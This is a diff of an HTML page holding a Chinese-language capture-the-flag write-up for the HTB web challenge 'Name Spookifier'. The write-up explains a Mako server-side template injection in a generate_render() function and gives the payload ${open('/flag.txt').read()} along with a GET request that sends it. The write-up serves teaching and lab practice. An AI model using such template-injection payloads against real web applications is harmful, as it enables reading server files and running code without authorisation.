@@ -3,79 +3,76 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>[Web] Spookifier — Mako SSTI | WP</title>
-  <link rel="stylesheet" href="../../../style.css">
-  <link rel="shortcut icon" href="../../../favicon.ico">
+  <title>[Web] Name Spookifier | SSTI WP</title>
+  <link rel="stylesheet" href="../../../../style.css">
 </head>
 <body>
 
-  <div class="wp-content" data-category="web" data-competition="HTB" data-challenge="Spookifier" data-difficulty="easy" data-date="2026-5-12">
-
-    <h1 class="wp-title">[Web] Spookifier — Mako SSTI</h1>
-
-    <!-- 0x00 Flag.txt 在正常代码流程中没有被直接调用 -->
-    <div class="wp-section">
-      <h2>0x00 Flag.txt 在正常代码流程中没有被直接调用</h2>
-      <p><code>flag.txt</code> 的内容是 <code>HTB{f4k3_fl4g_f0r_t3st1ng}</code>，它通过 Dockerfile 被复制到容器的 <code>/flag.txt</code> 路径：</p>
-      <div class="ide">
-        <pre><span class="line">COPY flag.txt /flag.txt</span></pre>
-      </div>
-    </div>
-
-    <!-- 0x01 存在服务端模板注入 (SSTI) 漏洞 -->
-    <div class="wp-section">
-      <h2>0x01 存在服务端模板注入 (SSTI) 漏洞可以读取它</h2>
-      <p>通过完整阅读代码，分析得出关键漏洞链条如下。</p>
-    </div>
-
-    <!-- 0x02 调用流程 -->
-    <div class="wp-section">
-      <h2>0x02 调用流程</h2>
-      <p>整个请求处理链路：</p>
-      <p><strong>①</strong> 用户访问 <code>/?text=用户输入</code> → <code>routes.py</code> 第9行获取 <code>text</code> 参数</p>
-      <p><strong>②</strong> <code>text</code> 传入 <code>spookify(text)</code> → <code>change_font()</code> 用4种字体转换 → <code>generate_render()</code></p>
-      <p><strong>③</strong> 关键漏洞点在 <code>util.py</code> 第288行：</p>
-      <div class="ide" id="code-generate-render">
-        <pre></pre>
-      </div>
-    </div>
-
-    <!-- 0x03 漏洞原理 -->
-    <div class="wp-section">
-      <h2>0x03 漏洞原理</h2>
-      <p>用户输入先通过 <code>.format()</code> 插入到字符串中，然后这个字符串被 <code>mako.template.Template().render()</code> 作为 Mako 模板执行。如果用户输入中包含 Mako 模板语法（如 <code>${表达式}</code> 或 <code><%python>...</%python></code>），这些代码会在服务端被执行。</p>
-      <p>特别注意 <code>font4</code>（第172-266行）几乎保留了所有原始字符（包括 <code>$</code>, <code>{</code>, <code>}</code>, <code><</code>, <code>%</code>, <code>></code> 等），这意味着通过构造特定输入，可以让 Mako 模板语法在 font4 的转换结果中保持完整。</p>
-    </div>
-
-    <!-- 0x04 攻击示例 -->
-    <div class="wp-section">
-      <h2>0x04 攻击示例</h2>
-      <p>攻击者可以通过 SSTI 注入类似如下的 payload 来读取 <code>/flag.txt</code>：</p>
-      <div class="ide">
-        <pre><span class="line">${open('/flag.txt').read()}</span></pre>
-      </div>
-      <p>拿到 flag 🎃</p>
-    </div>
-
-    <!-- 0x05 总结 -->
-    <div class="wp-section">
-      <h2>0x05 总结</h2>
-      <p>
-        <strong>正常访问</strong>：网页不会调用 <code>flag.txt</code>，它只是个 "Name Spookifier" 万圣节名字转换器。<br><br>
-        <strong>触发条件</strong>：当用户通过 <code>?text=</code> 参数注入 Mako 模板代码时，<code>Template(result).render()</code> 会执行该代码，从而可以读取 <code>/flag.txt</code> 获取 flag。<br><br>
-        <strong>根本原因</strong>：用户输入未经转义就直接进入 Mako 模板引擎执行，属于典型的 SSTI 漏洞。
-      </p>
-    </div>
-
-    <!-- 0x06 Flag -->
-    <div class="wp-section">
-      <h2>0x06 Flag</h2>
-      <div class="ide">
-        <pre><span class="line">HTB{f4k3_fl4g_f0r_t3st1ng}</span></pre>
-      </div>
-    </div>
-
+<div class="wp-content" data-category="web" data-competition="HTB" data-challenge="Name Spookifier" data-difficulty="easy" data-date="2026-04-16">
+  <h1 class="wp-title">[Web] Name Spookifier</h1>
+  <h4 class="sub-title">Mako SSTI 漏洞利用 | 无过滤读取Flag</h4>
+  <div class="wp-meta">
+    <span>Web / SSTI / Mako模板</span>
+    <span>难度：简单</span>
   </div>
+
+  <div class="wp-section">
+    <h2>0x00 题目分析</h2>
+    <p>题目是一个万圣节风格的名字转换器，用户传入 text 参数，后端会将文本转换为4种不同字体并展示。</p>
+    <p>正常流程中，程序<strong>不会主动读取 flag.txt</strong>，仅提供文本渲染功能。</p>
+  </div>
+
+  <div class="wp-section">
+    <h2>0x01 关键代码分析</h2>
+    <p>flag.txt 仅通过 Dockerfile 放入容器，无直接调用：</p>
+    <div class="ide"><pre>COPY flag.txt /flag.txt</pre></div>
+    <p>漏洞点位于 <strong>util.py</strong> 的 <code>generate_render()</code> 函数：</p>
+    <div class="ide"><pre>def generate_render(converted_fonts):
+    result = '''
+        <tr><td>{0}</td></tr>
+        <tr><td>{1}</td></tr>
+        <tr><td>{2}</td></tr>
+        <tr><td>{3}</td></tr>
+    '''.format(*converted_fonts)
+    return Template(result).render()</pre></div>
+    <p>用户输入 → format 拼接 → <strong>直接交给 Mako 模板引擎执行</strong> → 造成 SSTI。</p>
+  </div>
+
+  <div class="wp-section">
+    <h2>0x02 漏洞原理</h2>
+    <p>1. 用户通过 <code>/?text=...</code> 传入恶意内容</p>
+    <p>2. 经过字体转换后，<strong>font4 保留特殊符号 $ { } < %</strong></p>
+    <p>3. 内容进入模板后被 <code>Template().render()</code> 执行</p>
+    <p>4. 可执行任意 Python 代码、读取文件</p>
+  </div>
+
+  <div class="wp-section">
+    <h2>0x03 漏洞利用 Payload</h2>
+    <p>直接读取 /flag.txt：</p>
+    <div class="ide"><pre>${open('/flag.txt').read()}</pre></div>
+    <p>发送方式：</p>
+    <div class="ide"><pre>GET /?text=${open('/flag.txt').read()} HTTP/1.1</pre></div>
+  </div>
+
+  <div class="wp-section">
+    <h2>0x04 成功获取 Flag</h2>
+    <p>服务器执行模板表达式，返回文件内容：</p>
+    <div class="ide"><pre>HTB{f4k3_fl4g_f0r_t3st1ng}</pre></div>
+  </div>
+
+  <div class="wp-section">
+    <h2>0x05 漏洞总结</h2>
+    <p>• 漏洞类型：<strong>Mako 服务端模板注入 SSTI</strong></p>
+    <p>• 根本原因：用户输入<strong>未过滤、未转义</strong>直接传入模板执行</p>
+    <p>• 利用难度：极低，font4 无字符过滤，可直接执行 Payload</p>
+    <p>• 危害：可读取任意文件、RCE（视环境而定）</p>
+  </div>
+
+  <div class="wp-section">
+    <h2>0x06 Flag</h2>
+    <div class="ide"><pre>HTB{f4k3_fl4g_f0r_t3st1ng}</pre></div>
+  </div>
+</div>
 
 <script>
 document.querySelectorAll('.ide pre').forEach(pre => {
@@ -90,31 +87,6 @@ document.querySelectorAll('.ide pre').forEach(pre => {
   })
 })
 </script>
-
-<script>
-// Inject the code block that contains raw HTML tags as displayable text
-(function() {
-  var el = document.querySelector('#code-generate-render pre');
-  if (!el) return;
-  var lines = [
-    'def generate_render(converted_fonts):',
-    "    result = '''",
-    '        <tr><td>{0}</td></tr>',
-    '        <tr><td>{1}</td></tr>',
-    '        <tr><td>{2}</td></tr>',
-    '        <tr><td>{3}</td></tr>',
-    "    '''.format(*converted_fonts)",
-    '    return Template(result).render()  # \u2190 Mako\u6a21\u677f\u6e32\u67d3\uff01'
-  ];
-  el.innerHTML = lines.map(function(l) {
-    var span = document.createElement('span');
-    span.className = 'line';
-    span.textContent = l;
-    return span.outerHTML;
-  }).join('');
-})();
-</script>
-
-<script src="../../../wp-script.js"></script>
+<script src="../../../../wp-script.js"></script>
 </body>
 </html>
